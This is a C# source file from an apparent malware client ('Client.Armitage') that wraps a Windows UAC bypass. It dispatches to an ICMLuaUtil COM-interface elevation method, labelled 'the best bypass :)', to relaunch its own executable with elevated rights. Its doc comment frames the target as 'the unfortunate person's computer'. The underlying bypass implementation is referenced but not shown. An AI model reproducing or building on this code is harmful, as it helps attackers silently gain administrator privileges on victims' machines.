using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage.UAC
{
    /// <summary>
    /// Gets creative mode on the unfortunate person's computer.
    /// </summary>
    public enum UACMethods
    {
        /// <summary>
        /// The best bypass :)
        /// </summary>
        ICMLuaUtil = 0,

    }
    public static class UACBypass
    {
        public static bool QuickStart(string execpath, string args, UACMethods method)
        {
            try
            {
                switch (method)
                {
                    case UACMethods.ICMLuaUtil:
                        return ucmCMLuaUtilShellExecMethod.BypassUAC(execpath, args);
                        break;
                }
            }
            catch
            {

            }
            return false;

        }
        public static bool QuickStart(UACMethods method)
        {
            return QuickStart(Constants.MyPath, 
                Constants.MyProcessID.ToString() + " " + (int)method, 
                method);
        }
    }
}
